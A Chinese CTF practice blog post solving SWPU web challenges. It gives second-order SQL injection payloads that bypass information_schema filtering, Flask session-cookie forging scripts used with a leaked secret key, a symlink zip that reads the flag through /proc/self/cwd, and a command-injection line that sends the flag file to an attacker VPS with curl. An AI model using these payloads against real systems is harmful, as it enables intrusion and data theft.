<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="cop's blog"><link rel="stylesheet" type="text/css" href="//fonts.loli.net/css?family=Source+Code+Pro"><link rel="stylesheet" type="text/css" href="/css/style.css?v=2.0.5"><link rel="stylesheet" type="text/css" href="/css/highlight.css?v=2.0.5"><link rel="Shortcut Icon" href="/favicon.ico"><link rel="bookmark" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><title>swpu刷题记录 | cop's blog</title></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">swpu刷题记录</h1><a id="logo" href="/.">cop's blog</a><p class="description"></p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> Start</i></a><a href="/archives/"><i class="fa fa-archive"> Archiv</i></a><a href="/about/"><i class="fa fa-user"> Über</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div><div id="search-form"><div id="result-mask" class="hide"></div><label><input id="search-key" type="text" autocomplete="off" placeholder="Suche"></label><div id="result-wrap" class="hide"><div id="search-result"></div></div><div class="hide"><template id="search-tpl"><div class="item"><a href="/{path}" title="{title}"><div class="title">{title}</div><div class="time">{date}</div><div class="tags">{tags}</div></a></div></template></div></div></div><div id="layout" class="layout-g"><div class="layout-l"><div class="content_container"><div class="post"><h1 class="post-title">swpu刷题记录</h1><div class="post-meta"><a href="/2020/01/12/swpu刷题记录/#comments" class="comment-count"></a><p><span class="date">Jan 12, 2020</span><span><i id="busuanzi_container_page_pv"><i id="busuanzi_value_page_pv"></i><i>Schlägt</i></i></span></p></div><div class="post-content"><h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p>进去一看一个登陆框。注册个账号登陆后，有个发布广告的功能，发布之后查看，怀疑存在二次注入<br>试了一下发现存在二次注入，注入点在标题处，过滤了ordey by 用group by判断出有22列<br>回显位置是 2，3，库名web1，但是查表名的时候过滤了information_schema 凉凉<br>看wp学新操作<a href="https://www.anquanke.com/post/id/193512#h3-2" target="_blank" rel="noopener">聊一聊bypass information_schema</a><br>MySQL5.7的新特性<br>由于performance_schema过于发杂，所以mysql在5.7版本中新增了sys schemma，基础数据来自于performance_chema和information_schema<br>两个库，本身数据库不存储数据。<br>注：利用innoDB引擎绕过对information_schema的过滤，但是mysql默认是关闭InnoDB存储引擎的<br>sys.schema_auto_increment_columns表</p>
<p>fortest库<br>    data 表存在自增id<br>    no_a_i_table 表不存在自增id<br>    test 表存在自增id<br>sys.schema_table_statistics_with_buffer和sys.x$schema_table_statistics_with_buffer包含上面所有表<br>试了一下发现buu环境没这个表<br>还是用innodb绕的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span>22</span><br><span class="line">出表名</span><br><span class="line"><span class="string">'union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span>22</span><br><span class="line">出数据</span><br><span class="line"></span><br><span class="line">附上join报错出列名payload</span><br><span class="line">第一列的列名</span><br><span class="line"><span class="string">' union all select*from (select * from users as a join users b)c--+</span></span><br><span class="line"><span class="string">获取次列及后续列名</span></span><br><span class="line"><span class="string">'</span> union all select*from (select * from users as a join users b using(id,username))c--+</span><br><span class="line"></span><br><span class="line">select/**/group_concat(b)/**/from(select/**/1,2,3/**/as/**/b/**/union/**/select*from/**/users)x</span><br><span class="line">这部分也可以换成</span><br><span class="line">select/**/group_concat(`3`)/**/from(select/**/1,2,3/**/union/**/select*from/**/users)x</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uploader.shimo.im/f/doA6EYgBPcQz7FHH.png" alt></p>
<h2 id="WEB3"><a href="#WEB3" class="headerlink" title="WEB3"></a>WEB3</h2><p>看了下以为是ssti结果测试下不是，upload权限不够没思路了，下面跟着wp复现一波<br>upload目录有个404 not found的提示<br>在 flask 中，可以使⽤用 app.errorhandler()装饰器来注册错误处理函数，参数是 HTTP 错误状态码或者特定的异常类，由此可以联想在 404 错误中会有东西存在<br>随便访问一个不存在的url<br><img src="https://uploader.shimo.im/f/uJiL1mFp6JogOZum.png" alt><br>有趣的东西出现了  Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==<br>base64解码 SECRET_KEY:keyqqqwwweee!@#$%^&amp;*<br>再联想到刚才访问upload显示的权限不够，可以判断是使用该key伪造session<br>附上p神解密session的脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line"></span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b<span class="string">'.'</span>, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b<span class="string">'.'</span>, 1)</span><br><span class="line"></span><br><span class="line">    decompress = False</span><br><span class="line">    <span class="keyword">if</span> payload.startswith(b<span class="string">'.'</span>):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">print</span>(decryption(sys.argv[1].encode()))</span><br></pre></td></tr></table></figure></p>
<p>附上flask session加密解密脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""</span><span class="string">" Flask Session Cookie Decoder/Encoder "</span><span class="string">""</span></span><br><span class="line">__author__ = <span class="string">'Wilson Sumanang, Alexandre ZANNI'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># standard imports</span></span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line">import ast</span><br><span class="line"></span><br><span class="line"><span class="comment"># Abstract Base Classes (PEP 3119)</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[0] &lt; 3: <span class="comment"># &lt; 3.0</span></span><br><span class="line">    raise Exception(<span class="string">'Must be using at least Python 3'</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    from abc import ABCMeta, abstractmethod</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    from abc import ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lib for argument parsing</span></span><br><span class="line">import argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># external Imports</span></span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">class MockApp(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self, secret_key):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    class FSCM(metaclass=ABCMeta):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">            <span class="string">""</span><span class="string">" Encode a Flask session cookie "</span><span class="string">""</span></span><br><span class="line">            try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">"[Encoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                raise e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def decode(session_cookie_value, secret_key=None):</span><br><span class="line">            <span class="string">""</span><span class="string">" Decode a Flask cookie  "</span><span class="string">""</span></span><br><span class="line">            try:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==None):</span><br><span class="line">                    compressed = False</span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">'.'</span>):</span><br><span class="line">                        compressed = True</span><br><span class="line">                        payload = payload[1:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">"."</span>)[0]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">return</span> s.loads(session_cookie_value)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">"[Decoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                raise e</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    class FSCM(ABC):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">            <span class="string">""</span><span class="string">" Encode a Flask session cookie "</span><span class="string">""</span></span><br><span class="line">            try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="built_in">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">"[Encoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                raise e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def decode(session_cookie_value, secret_key=None):</span><br><span class="line">            <span class="string">""</span><span class="string">" Decode a Flask cookie  "</span><span class="string">""</span></span><br><span class="line">            try:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==None):</span><br><span class="line">                    compressed = False</span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">'.'</span>):</span><br><span class="line">                        compressed = True</span><br><span class="line">                        payload = payload[1:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">"."</span>)[0]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">return</span> s.loads(session_cookie_value)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">"[Decoding error] &#123;&#125;"</span>.format(e)</span><br><span class="line">                raise e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># Args are only relevant for __main__ usage</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">## Description for help</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">                description=<span class="string">'Flask Session Cookie Decoder/Encoder'</span>,</span><br><span class="line">                epilog=<span class="string">"Author : Wilson Sumanang, Alexandre ZANNI"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## prepare sub commands</span></span><br><span class="line">    subparsers = parser.add_subparsers(<span class="built_in">help</span>=<span class="string">'sub-command help'</span>, dest=<span class="string">'subcommand'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the encode command</span></span><br><span class="line">    parser_encode = subparsers.add_parser(<span class="string">'encode'</span>, <span class="built_in">help</span>=<span class="string">'encode'</span>)</span><br><span class="line">    parser_encode.add_argument(<span class="string">'-s'</span>, <span class="string">'--secret-key'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">'Secret key'</span>, required=True)</span><br><span class="line">    parser_encode.add_argument(<span class="string">'-t'</span>, <span class="string">'--cookie-structure'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">'Session cookie structure'</span>, required=True)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## create the parser for the decode command</span></span><br><span class="line">    parser_decode = subparsers.add_parser(<span class="string">'decode'</span>, <span class="built_in">help</span>=<span class="string">'decode'</span>)</span><br><span class="line">    parser_decode.add_argument(<span class="string">'-s'</span>, <span class="string">'--secret-key'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">'Secret key'</span>, required=False)</span><br><span class="line">    parser_decode.add_argument(<span class="string">'-c'</span>, <span class="string">'--cookie-value'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                                <span class="built_in">help</span>=<span class="string">'Session cookie value'</span>, required=True)</span><br><span class="line"></span><br><span class="line">    <span class="comment">## get args</span></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment">## find the option chosen</span></span><br><span class="line">    <span class="keyword">if</span>(args.subcommand == <span class="string">'encode'</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key is not None and args.cookie_structure is not None):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    <span class="keyword">elif</span>(args.subcommand == <span class="string">'decode'</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key is not None and args.cookie_value is not None):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.decode(args.cookie_value,args.secret_key))</span><br><span class="line">        <span class="keyword">elif</span>(args.cookie_value is not None):</span><br><span class="line">            <span class="built_in">print</span>(FSCM.decode(args.cookie_value))</span><br></pre></td></tr></table></figure></p>
<p>用法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解密:python flask_session_manager.py decode -c -s <span class="comment"># -c是flask cookie里的session值 -s参数是SECRET_KEY</span></span><br><span class="line">加密:python flask_session_manager.py encode -s -t <span class="comment"># -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://uploader.shimo.im/f/DUAYU9L4kXcPb8hV.png" alt><br>把id改为1<br><img src="https://uploader.shimo.im/f/O41Pa517aAE3rcMA.png" alt><br>改下session再去访问upload<br>eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoiMTIzIiwidXNlcm5hbWUiOiJhZG1pbiJ9.XhrKDg.SLL7JmZeSFo_GQCn2iLWZc14pmU<br><img src="https://uploader.shimo.im/f/c8aquoI0iloshq7d.png" alt><br>f12出源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">'/upload'</span>,methods=[<span class="string">'GET'</span>,<span class="string">'POST'</span>])</span><br><span class="line">def upload():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'id'</span>] != b<span class="string">'1'</span>:</span><br><span class="line">        <span class="built_in">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">'POST'</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">'password'</span>]</span><br><span class="line">        name = name+<span class="string">'qweqweqwe'</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">'file'</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span>+md5_one+<span class="string">'/'</span>+session[<span class="string">'username'</span>]+<span class="string">"/"</span></span><br><span class="line">        path_base = basepath+<span class="string">'/upload/'</span>+md5_ip+<span class="string">'/'</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"zip"</span> != filename.split(<span class="string">'.'</span>)[-1]:</span><br><span class="line">            <span class="built_in">return</span> <span class="string">'zip only allowed'</span></span><br><span class="line">        <span class="keyword">if</span> not os.path.exists(path_base):</span><br><span class="line">            try:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> not os.path.exists(path):</span><br><span class="line">            try:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'error'</span></span><br><span class="line">        <span class="keyword">if</span> not os.path.exists(pathname):</span><br><span class="line">            try:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'error'</span></span><br><span class="line">        try:</span><br><span class="line">            cmd = <span class="string">"unzip -n -d "</span>+path+<span class="string">" "</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">'|'</span>) != -1 or cmd.find(<span class="string">';'</span>) != -1:</span><br><span class="line">				waf()</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'error'</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            <span class="built_in">return</span> <span class="string">'error'</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">'r'</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[0]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">'is_login'</span>] != True:</span><br><span class="line">            <span class="built_in">return</span> <span class="string">'not login'</span></span><br><span class="line">        try:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">'/'</span>) != -1:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="built_in">return</span> <span class="string">'error'</span></span><br><span class="line">            image = open(path+unzip_filename, <span class="string">"rb"</span>).<span class="built_in">read</span>()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">            <span class="built_in">return</span> resp</span><br><span class="line">        except Exception as e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="built_in">return</span> <span class="string">'error'</span></span><br><span class="line">    <span class="built_in">return</span> render_template(<span class="string">'upload.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/showflag'</span>)</span><br><span class="line">def showflag():</span><br><span class="line">    <span class="keyword">if</span> True == False:</span><br><span class="line">        image = open(os.path.join(<span class="string">'./flag/flag.jpg'</span>), <span class="string">"rb"</span>).<span class="built_in">read</span>()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">'Content-Type'</span>] = <span class="string">'image/png'</span></span><br><span class="line">        <span class="built_in">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> <span class="string">"can't give you"</span></span><br></pre></td></tr></table></figure></p>
<h3 id="使用软链接完成文件读取"><a href="#使用软链接完成文件读取" class="headerlink" title="使用软链接完成文件读取"></a>使用软链接完成文件读取</h3><p>上传一个软链接压缩包，完成flag读取。因为缺少flag的绝对路径，只有相对于flask工作目录的相对路径./flag/flag.jpg，所以要先获取<br>flask的工作目录。<br>在linux中，/proc/self/cwd/会指向进程的当前目录，那么在不知道flask工作目录时，我们可以用/proc/self/cwd/flag/flag.jpg来访问<br>flag.jpg，exp如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /proc/self/cwd/flag/flag.jpg exp</span><br><span class="line">zip -ry exp.zip exp  <span class="comment"># -y可以保存软连接压缩</span></span><br></pre></td></tr></table></figure></p>
<p>图片加载失败，抓个包flag就出来了<br><img src="https://uploader.shimo.im/f/5RTSeSDlGRwtwDX9.png" alt></p>
<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(sky=`awk <span class="string">'BEGIN&#123;printf "%c\n",47&#125;'</span>`&amp;&amp;curl vps_ip:23333 -T `cat .<span class="variable">$&#123;sky&#125;</span>flag<span class="variable">$&#123;sky&#125;</span>flag.jpg`)</span><br></pre></td></tr></table></figure>
<p>但是不行，在bp里 printf之后断开了后面的内容传不上去，我用$IFS连接也没用</p>
